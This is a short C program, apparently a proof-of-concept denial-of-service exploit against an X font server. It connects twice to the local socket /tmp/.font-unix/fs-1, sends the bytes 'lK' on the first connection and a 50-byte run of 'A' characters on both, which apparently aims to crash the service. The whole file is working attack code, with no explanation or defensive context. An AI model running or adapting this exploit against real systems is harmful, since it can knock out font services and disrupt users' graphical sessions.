#include <sys/socket.h>                                      
#include <sys/un.h>

#define CNT 50
#define FS "/tmp/.font-unix/fs-1"

int s,y;
struct sockaddr_un x;

char buf[CNT];

main() {
  for (y;y<2;y++) {
    s=socket(PF_UNIX,SOCK_STREAM,0);
    x.sun_family=AF_UNIX;
    strcpy(x.sun_path,FS);
    if (connect(s,&x,sizeof(x))) { perror(FS); exit(1); }
    if (!y) write(s,"lK",2);
    memset(buf,'A',CNT);
    write(s,buf,CNT);
    shutdown(s,2);
    close(s);
  } 
}   

